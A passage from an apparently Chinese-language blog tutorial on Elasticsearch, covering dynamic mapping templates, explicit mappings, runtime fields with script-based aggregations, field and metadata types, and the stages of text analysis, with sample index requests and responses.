&#123;</span><br><span class="line">          &quot;type&quot;: &quot;float&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;my_integer&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;long&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="动态映射模板"><a href="#动态映射模板" class="headerlink" title="动态映射模板"></a>动态映射模板</h4><p>动态映射模板允许你在默认的动态模板规则之上更好的控制es映射你的数据类型，通过设置动态参数为true或者runtime来开启动态映射。然后就可以用动态模板去自定义映射，并且可以通过下面的匹配条件来动态的添加字段。</p><ul><li>match_mapping_type 对es检测到的数据类型进行操作。</li><li>match and unmatch 使用正则去匹配字段名称。</li><li>path_match and path_unmatch 在字段的完整的点路径上操作。</li><li>如果上面都不符合，不会匹配任何字段。</li></ul><p>==动态字段匹配只会在字段包含一个具体的值的时候被添加，所以如果当字段是null或者是空的数组，他会在这个文档的第一个具体的值出来的时候被建立索引==</p><h5 id="match-mapping-type"><a href="#match-mapping-type" class="headerlink" title="match_mapping_type"></a>match_mapping_type</h5><p>match_mapping_type通过json解析出来数据类型，因为json区分不了long和interger或者double和float，所以会给number识别成long而float识别成double。</p><p>下面是一个将数字识别成interger而不是long，string识别成text的keyword。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;dynamic_templates&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;integers&quot;: &#123;</span><br><span class="line">          &quot;match_mapping_type&quot;: &quot;long&quot;,</span><br><span class="line">          &quot;mapping&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;integer&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;strings&quot;: &#123;</span><br><span class="line">          &quot;match_mapping_type&quot;: &quot;string&quot;,</span><br><span class="line">          &quot;mapping&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;text&quot;,</span><br><span class="line">            &quot;fields&quot;: &#123;</span><br><span class="line">              &quot;raw&quot;: &#123;</span><br><span class="line">                &quot;type&quot;:  &quot;keyword&quot;,</span><br><span class="line">                &quot;ignore_above&quot;: 256</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my-index-000001/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;my_integer&quot;: 5, </span><br><span class="line">  &quot;my_string&quot;: &quot;Some string&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>my_interger会被映射成interget。</p><p>my_string会被识别成带keyword的text。</p><h5 id="match和unmatch"><a href="#match和unmatch" class="headerlink" title="match和unmatch"></a>match和unmatch</h5><p>match使用一个或多个来匹配字段名，unmatch使用一个或多个来排除被match匹配上的字段。</p><p>使用match_pattern来支持正则，例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;match_pattern&quot;: &quot;regex&quot;,</span><br><span class="line">&quot;match&quot;: &quot;^profit_\d+$&quot;</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;dynamic_templates&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;longs_as_strings&quot;: &#123;</span><br><span class="line">          &quot;match_mapping_type&quot;: &quot;string&quot;,</span><br><span class="line">          &quot;match&quot;:   &quot;long_*&quot;,  // 可以支持数组 &quot;match&quot;: [&quot;long_*&quot;, &quot;integer_*&quot;]</span><br><span class="line">          &quot;unmatch&quot;: &quot;*_text&quot;,// 可以支持数组</span><br><span class="line">          &quot;mapping&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;long&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my-index-000001/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;long_num&quot;: &quot;5&quot;, </span><br><span class="line">  &quot;long_text&quot;: &quot;foo&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>string类型的long_num字段由于匹配上了match的long_*规则，所以他的类型为long。</p><p>string类型的long_text字段由于匹配上了unmatch的*_text规则，所以他的类型还是string。</p><h5 id="path-match和path-unmatch"><a href="#path-match和path-unmatch" class="headerlink" title="path_match和path_unmatch"></a>path_match和path_unmatch</h5><p>它会匹配全路径名称而不是最终的名字，比如name.first，而match匹配的是first。</p><p>“norms”:false 来关闭评分</p><p>“index”:false 来关闭索引 用于减少磁盘空间</p><h4 id="明确的mapping"><a href="#明确的mapping" class="headerlink" title="明确的mapping"></a>明确的mapping</h4><p>创建一个明确的mapping索引</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT /my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">      &quot;age&quot;:    &#123; &quot;type&quot;: &quot;integer&quot; &#125;,  </span><br><span class="line">      &quot;email&quot;:  &#123; &quot;type&quot;: &quot;keyword&quot;  &#125;, </span><br><span class="line">      &quot;name&quot;:   &#123; &quot;type&quot;: &quot;text&quot;  &#125;     </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加一个字段到已存在的mapping里面</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /my-index-000001/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  &quot;properties&quot;: &#123;</span><br><span class="line">    &quot;employee-id&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: &quot;keyword&quot;,</span><br><span class="line">      &quot;index&quot;: false</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看单个字段的映射</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /my-index-000001/_mapping/field/employee-id</span><br></pre></td></tr></table></figure><h4 id="运行时字段"><a href="#运行时字段" class="headerlink" title="运行时字段"></a>运行时字段</h4><ul><li>添加字段到已经存在的文档而不需要重建索引</li><li>直接和你的数据打交道而不用知道它的结构</li><li>在查询的时候从一个索引字段里面重写返回值</li><li>定义一个明确的字段而不是修改底层结构</li></ul><p>运行时字段不会建立索引，所以建立一个运行时字段不会增大索引大小。</p><p>如果不知道以后该展示成什么样，可以使用运行时字段，后期可以更改。</p><p>运行时字段可以对现有索引字段进行操作，比如求平均数等等。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST my-index-000001/_bulk?refresh=true</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516729294000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;5.2&quot;,&quot;start&quot;: &quot;300&quot;,&quot;end&quot;:&quot;8675309&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516642894000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;5.8&quot;,&quot;start&quot;: &quot;300&quot;,&quot;end&quot;:&quot;8675309&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516556494000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;5.1&quot;,&quot;start&quot;: &quot;300&quot;,&quot;end&quot;:&quot;8675309&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516470094000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;5.6&quot;,&quot;start&quot;: &quot;300&quot;,&quot;end&quot;:&quot;8675309&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516383694000,&quot;model_number&quot;:&quot;HG537PU&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;4.2&quot;,&quot;start&quot;: &quot;400&quot;,&quot;end&quot;:&quot;8625309&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516297294000,&quot;model_number&quot;:&quot;HG537PU&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:&quot;4.0&quot;,&quot;start&quot;: &quot;400&quot;,&quot;end&quot;:&quot;8625309&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>添加运行时字段</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  &quot;runtime&quot;: &#123;</span><br><span class="line">    &quot;measures.start&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: &quot;long&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;measures.end&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: &quot;long&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求start和end各自的平均值</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;avg_start&quot;: &#123;</span><br><span class="line">      &quot;avg&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;measures.start&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;avg_end&quot;: &#123;</span><br><span class="line">      &quot;avg&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;measures.end&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">--- response ---</span><br><span class="line">&#123;</span><br><span class="line">  &quot;aggregations&quot; : &#123;</span><br><span class="line">    &quot;avg_start&quot; : &#123;</span><br><span class="line">      &quot;value&quot; : 333.3333333333333</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;avg_end&quot; : &#123;</span><br><span class="line">      &quot;value&quot; : 8658642.333333334</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以求end-start的各项指标</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;runtime_mappings&quot;: &#123;</span><br><span class="line">    &quot;duration&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: &quot;long&quot;,</span><br><span class="line">      &quot;script&quot;: &#123;</span><br><span class="line">        &quot;source&quot;: &quot;&quot;&quot;</span><br><span class="line">          emit(doc[&#x27;measures.end&#x27;].value - doc[&#x27;measures.start&#x27;].value);</span><br><span class="line">          &quot;&quot;&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;duration_stats&quot;: &#123;</span><br><span class="line">      &quot;stats&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;duration&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">--- response ---</span><br><span class="line">&#123;</span><br><span class="line">  &quot;aggregations&quot; : &#123;</span><br><span class="line">    &quot;duration_stats&quot; : &#123;</span><br><span class="line">      &quot;count&quot; : 6,</span><br><span class="line">      &quot;min&quot; : 8624909.0,</span><br><span class="line">      &quot;max&quot; : 8675009.0,</span><br><span class="line">      &quot;avg&quot; : 8658309.0,</span><br><span class="line">      &quot;sum&quot; : 5.1949854E7</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查找的时候重写value</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST my-index-000001/_bulk?refresh=true</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516729294000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:5.2&#125;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516642894000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:5.8&#125;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516556494000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:5.1&#125;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516470094000,&quot;model_number&quot;:&quot;QVKC92Q&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:5.6&#125;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516383694000,&quot;model_number&quot;:&quot;HG537PU&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:4.2&#125;&#125;</span><br><span class="line">&#123;&quot;index&quot;:&#123;&#125;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:1516297294000,&quot;model_number&quot;:&quot;HG537PU&quot;,&quot;measures&quot;:&#123;&quot;voltage&quot;:4.0&#125;&#125;</span><br></pre></td></tr></table></figure><p>查找的时候对model_number=HG537PU的measures.voltage进行*1.7得操作。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">POST my-index-000001/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;runtime_mappings&quot;: &#123;</span><br><span class="line">    &quot;measures.voltage&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: &quot;double&quot;,</span><br><span class="line">      &quot;script&quot;: &#123;</span><br><span class="line">        &quot;source&quot;:</span><br><span class="line">        &quot;&quot;&quot;if (doc[&#x27;model_number.keyword&#x27;].value.equals(&#x27;HG537PU&#x27;))</span><br><span class="line">        &#123;emit(1.7 * params._source[&#x27;measures&#x27;][&#x27;voltage&#x27;]);&#125;</span><br><span class="line">        else&#123;emit(params._source[&#x27;measures&#x27;][&#x27;voltage&#x27;]);&#125;&quot;&quot;&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;model_number&quot;: &quot;HG537PU&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;fields&quot;: [&quot;measures.voltage&quot;]</span><br><span class="line">&#125;</span><br><span class="line">--- response ---</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;hits&quot; : &#123;</span><br><span class="line">    &quot;total&quot; : &#123;</span><br><span class="line">      &quot;value&quot; : 2,</span><br><span class="line">      &quot;relation&quot; : &quot;eq&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;max_score&quot; : 1.0296195,</span><br><span class="line">    &quot;hits&quot; : [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;my-index-000001&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;F1BeSXYBg_szTodcYCmk&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0296195,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;@timestamp&quot; : 1516383694000,</span><br><span class="line">          &quot;model_number&quot; : &quot;HG537PU&quot;,</span><br><span class="line">          &quot;measures&quot; : &#123;</span><br><span class="line">            &quot;voltage&quot; : 4.2</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;fields&quot; : &#123;</span><br><span class="line">          &quot;measures.voltage&quot; : [</span><br><span class="line">            7.14</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;my-index-000001&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;l02aSXYBkpNf6QRDO62Q&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0296195,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;@timestamp&quot; : 1516297294000,</span><br><span class="line">          &quot;model_number&quot; : &quot;HG537PU&quot;,</span><br><span class="line">          &quot;measures&quot; : &#123;</span><br><span class="line">            &quot;voltage&quot; : 4.0</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;fields&quot; : &#123;</span><br><span class="line">          &quot;measures.voltage&quot; : [</span><br><span class="line">            6.8</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字段数据类型"><a href="#字段数据类型" class="headerlink" title="字段数据类型"></a>字段数据类型</h4><p>每个字段都有数据类型，数据类型决定了它存储的数据。如你可以将string定义为text或者keyword字段，text可以被全文搜索，而keyword保留原样作为筛选和排序。</p><p>数据类型有不同的分组，相同分组下的字段有着相同的搜索行为，但是不同的空间使用和性能特征。</p><blockquote>常用类型如下</blockquote><ul><li>公共类型<ul><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/binary.html"><code>binary</code></a>    Binary将被编码成base64的字符串。</li><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/boolean.html"><code>boolean</code></a> <code>true</code>或者``false`。</li><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/keyword.html">Keywords</a> 关键字家族，包括<code>keyword</code>、<code>constant_word</code>和<code>wildcard</code>。</li><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/number.html">Numbers</a> 数字类型，如long和double，用来表示数量。</li><li>  <strong>Dates</strong> 日期， 包括 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/date.html"><code>date</code></a> 和 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/date_nanos.html"><code>date_nanos</code></a>。</li><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/field-alias.html"><code>alias</code></a> 别名，为一个存在的字段设置别名。</li></ul></li><li>对象和关系字段（Objects and relational types）<ul><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/object.html"><code>object</code></a> 一个json的对象。</li><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/flattened.html"><code>flattened</code></a> 整个json对象作为单个字段值。</li><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/nested.html"><code>nested</code></a> 保留其子地段关系的json对象。</li><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/parent-join.html"><code>join</code></a> 定义同一索引文档中的父子关系。</li></ul></li><li>结构化数据类型<ul><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/range.html">Range</a> 范围类型，如<code>long_range</code>，<code>double_range</code>，<code>date_range</code>和<code>ip_range</code>。</li><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/ip.html"><code>ip</code></a> ipv4或者ipv6地址。</li></ul></li><li>文本搜索类型<ul><li>  <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/text.html"><code>text</code> fields</a> 文本家族，包括<code>text</code>，<code>match_only_text</code></li></ul></li></ul><h4 id="元数据类型"><a href="#元数据类型" class="headerlink" title="元数据类型"></a>元数据类型</h4><h5 id="身份元数据字段"><a href="#身份元数据字段" class="headerlink" title="身份元数据字段"></a>身份元数据字段</h5><p>_index：文档所属的索引。</p><p>_id：文档的id。</p><h5 id="文档资源元数据字段"><a href="#文档资源元数据字段" class="headerlink" title="文档资源元数据字段"></a>文档资源元数据字段</h5><p>_source：文档中的JSON内容。</p><p>_size：_source字段的字节数组长度，由<a href="https://www.elastic.co/guide/en/elasticsearch/plugins/8.12/mapper-size.html"><code>mapper-size</code> plugin</a> 这个插件提供。</p><h5 id="Doc统计元数据字段"><a href="#Doc统计元数据字段" class="headerlink" title="Doc统计元数据字段"></a>Doc统计元数据字段</h5><p>_doc_count：当文档展示预聚合数据时，用于存储文档计数的自定义字段。</p><h5 id="索引元数据字段"><a href="#索引元数据字段" class="headerlink" title="索引元数据字段"></a>索引元数据字段</h5><p>_field_names：文档内包含非空值的字段。</p><p>_ignore：文档中因<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/ignore-malformed.html"><code>ignore_malformed</code></a> 在索引中被忽略的所有字段。</p><h5 id="路由元数据字段"><a href="#路由元数据字段" class="headerlink" title="路由元数据字段"></a>路由元数据字段</h5><p>_routing：路由一个文档到一个特定的分片的自定义路由值。</p><h5 id="其他的元数据字段"><a href="#其他的元数据字段" class="headerlink" title="其他的元数据字段"></a>其他的元数据字段</h5><p>_meta：应用程序指定的特殊元数据单元。</p><p>_tire：文档所属索引的当前数据首选项。</p><h3 id="文本分析"><a href="#文本分析" class="headerlink" title="文本分析"></a>文本分析</h3><p>文本分析使es去全文搜索，包括模糊搜索，而不仅仅是精确搜索。</p><h4 id="分析器的原理"><a href="#分析器的原理" class="headerlink" title="分析器的原理"></a>分析器的原理</h4><p>分析器有三个步骤</p><p>1、字符过滤（Character filters）</p><p>字符过滤对源文本的字节流进行添加、删除、替换等操作。如对拉丁-阿拉伯数字的转换，对html标签的转换。</p><p>2、分词器（Character filters）</p><p>将获取到的字符流按照分词器的规则分割成很多个词。比如说<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/analysis-whitespace-tokenizer.html"><code>whitespace</code></a> 分词器将”Quick brown fox!”切割成[Quick, brown, fox!]三个词。</p><p>3、分词过滤器（Token filters）</p><p>分词过滤器对分词进行添加、删除、修改等操作。比如说<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/analysis-lowercase-tokenfilter.html"><code>lowercase</code></a> 分词过滤器让所有的分词变成小写，<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/analysis-stop-tokenfilter.html"><code>stop</code></a>分词过滤器移除掉the这种公共的单词，<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/analysis-synonym-tokenfilter.html"><code>synonym</code></a>分词过滤器添加了同义词的功能。</p><h4 id="内置分析"><a href="#内置分析" class="headerlink" title="内置分析"></a>内置分析</h4><h5 id="Standard-Analyzer"><a href="#Standard-Analyzer" class="headerlink" title="Standard Analyzer"></a>Standard 